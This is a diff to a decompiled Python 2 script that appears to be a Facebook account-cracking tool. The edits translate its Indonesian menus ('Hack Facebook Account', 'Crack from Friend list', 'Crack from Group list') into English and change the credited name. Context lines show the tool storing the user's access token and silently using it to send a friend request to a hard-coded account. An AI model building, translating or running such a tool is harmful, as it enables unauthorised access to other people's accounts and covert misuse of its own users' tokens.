@@ -1,4 +1,4 @@
-#Decompiled by MR.K7C8NG
+#Decompiled by MR.Kuljit
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -95,7 +95,7 @@ def login():
                 zedd = open('login.txt', 'w')
                 zedd.write(z['access_token'])
                 zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin successful'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 os.system('xdg-open https://www.youtube.com/channel/UClJL1InBc0Y3s6YYbmSYPFg')
                 time.sleep(2)
@@ -105,7 +105,7 @@ def login():
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+            print '\n\x1b[1;91m[!] \x1b[1;93m Account Checkpoint Error'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
@@ -148,7 +148,7 @@ def menu():
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
     print '\x1b[1;37;40m1. Informasi Pengguna'
-    print '\x1b[1;37;40m2. Hack Akun Facebook'
+    print '\x1b[1;37;40m2. Hack Facebook Account'
     print '\x1b[1;37;40m3. Bot               '
     print '\x1b[1;37;40m4. Lainnya....       '
     print '\x1b[1;37;40m5. LogOut            '
@@ -536,8 +536,8 @@ def super():
     os.system('clear')
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Crack dari daftar Teman'
-    print '\x1b[1;37;40m2. Crack dari member Grup'
+    print '\x1b[1;37;40m1. Crack from Friend list'
+    print '\x1b[1;37;40m2. Crack from Group list'
     print '\x1b[1;31;40m0. Kembali'
     print
     pilih_super()
